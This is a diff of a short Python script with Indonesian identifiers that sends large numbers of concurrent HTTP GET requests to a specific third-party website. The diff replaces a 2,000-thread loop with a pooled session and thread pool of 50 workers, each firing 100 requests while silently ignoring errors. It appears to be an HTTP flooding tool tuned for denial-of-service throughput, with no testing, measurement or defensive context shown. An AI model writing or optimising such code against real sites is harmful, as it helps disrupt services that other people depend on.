@@ -1,29 +1,23 @@
-import threading
-import time
+from concurrent.futures import ThreadPoolExecutor
 import requests
 
 url = "https://beraffiliate.com/"
 
-def tugas(nama):
-    for i in range(5):
-        response = requests.get(url)
-        print(f"{nama} jalan ke-{i} {response.status_code}")
+session = requests.Session()
+adapter = requests.adapters.HTTPAdapter(
+    pool_connections=200,
+    pool_maxsize=200
+)
+session.mount("https://", adapter)
 
-threads = []
+def tugas(_):
+    for _ in range(100):
+        try:
+            session.get(url, timeout=5)
+        except:
+            pass
 
-# buat & start thread
-for i in range(1000):
-    t1 = threading.Thread(target=tugas, args=(f"Thread-1-{i}",))
-    t2 = threading.Thread(target=tugas, args=(f"Thread-2-{i}",))
+with ThreadPoolExecutor(max_workers=50) as executor:
+    executor.map(tugas, range(50))
 
-    t1.start()
-    t2.start()
-
-    threads.append(t1)
-    threads.append(t2)
-
-# tunggu semua thread selesai
-for t in threads:
-    t.join()
-
-print("Semua thread selesai")
+print("Selesai")
